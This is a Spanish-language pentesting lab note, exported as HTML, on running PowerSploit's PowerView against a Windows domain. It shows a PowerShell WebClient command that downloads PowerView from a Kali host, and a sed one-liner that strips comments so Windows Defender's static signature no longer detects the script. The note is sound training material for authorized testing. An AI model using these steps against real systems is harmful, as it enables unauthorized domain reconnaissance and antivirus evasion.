<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>POWERVIEW/POWERSPLOIT</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>POWERVIEW/POWERSPLOIT</h1><br/><p><em><strong><h1>POWER VIEW </h1></strong></em></p><p></p><p><h3>Forma parte de una suite de herramientas para entornos windows llamada POWERMAX</h3></p><p></p><p>Vamos a configurar una GPO que aplique a los equipos dentro de nuestro dominio.</p><p></p><p>Para ello vamos a herramientas dentro del panel de administración del DomainControles y administración de directivas de grupo.</p><p></p><p><img src="images/14-1.png" alt="images/14-1.png" /></p><p></p><p>La añadimos a nivel de dominio.</p><p></p><p><img src="images/14-2.png" alt="images/14-2.png" /></p><p></p><p>En este caso la aplicamos a nivel de equipos, en directivas, plantillas administrativas, componentes de windows y powershell.</p><p></p><p><img src="images/14-3.png" alt="images/14-3.png" /></p><p></p><p>Para que las políticas se apliquen a las maquinas debemos reiniciarlas porque se aplican a nivel de equipo y no se usuario.</p><p></p><p>La herramienta powersploit la encontramos en <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Esta suite de herramientas sirve para todas las fases de un pentest sobre equipos microsoft.</p><p></p><p>En este caso usaremos el modulo de reconocimiento.</p><p></p><p><img src="images/14-4.png" alt="images/14-4.png" /></p><p></p><p>Descargamos el repositorio y el script que nos interesa es el PowerView.ps1. Cabe destacar que son scripts powershell por lo que es necesario ejecutarlo desde la maquina windows. </p><p></p><p></p><p>Listo esto vamos a suponer que las dos máquinas que tenemos han sido proporcionadas por el cliente para realizar las pruebas.</p><p></p><p>Una forma muy básica de transferir el archivo a estas maquinas windows es:</p><p></p><p><div class="codebox"><pre><br />python2 -m SimpleHTTPServer </pre></div></p><p></p><p><img src="images/14-5.png" alt="images/14-5.png" /></p><p></p><p>Sirviendo la carpeta donde se encuentra el script vamos a la maquina windows.</p><p></p><p><div class="codebox"><pre><br />(<span style="color:#729fcf;font-weight:400">New-Object</span> System.NET.WebClient).DownloadFile(<span style="color:#edd400;font-weight:400">&quot;http://192.168.20.128:8000/PowerView.ps1&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;powerview.ps1&quot;</span>) </pre></div></p><p></p><p><img src="images/14-6.png" alt="images/14-6.png" /></p><p></p><p>Por supuesto si intentamos ejecutar el script directamente . ./powerview.ps1 veremos como windows defender bloqueará el archivo.</p><p></p><p>Esto es porque existe una firma dentro de windows defender que sabe que tipo de archivo y que contenido tiene este y por eso sabe que no debe ejecutarlo pero es muy sencillo de evadir de la siguiente forma:</p><p></p><p>En kali:</p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sed</span> <span style="color:#edd400;font-weight:400">&#39;/&lt;#/,/#&gt;/d&#39;</span> PowerView.ps1 &gt; new_powerview.ps1</pre></div></p><p></p><p>Este comando eliminará los comentarios del script haciendo que si la firma de windows defender es estática y mediocre esta deja de detectarlo como un archivo malicioso.</p><p></p><p>Volvemos a descargar el archivo a la maquina windows y si nos fijamos el archivo pesa menos ya que le hemos eliminado los comentarios.</p><p></p><p><img src="images/14-7.png" alt="images/14-7.png" /></p><p></p><p>Y si lo ejecutamos windows ni se dará cuenta.</p><p></p><p><img src="images/14-8.png" alt="images/14-8.png" /></p><p></p><p><h1>https://powersploit.readthedocs.io/en/latest/Recon/#domainldap-functions</h1></p><p></p><p><h1>https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview</h1></p><p></p><p><h1>https://activedirectorypro.com/powershell-commands/#ad</h1></p></div>
</body>
</html>
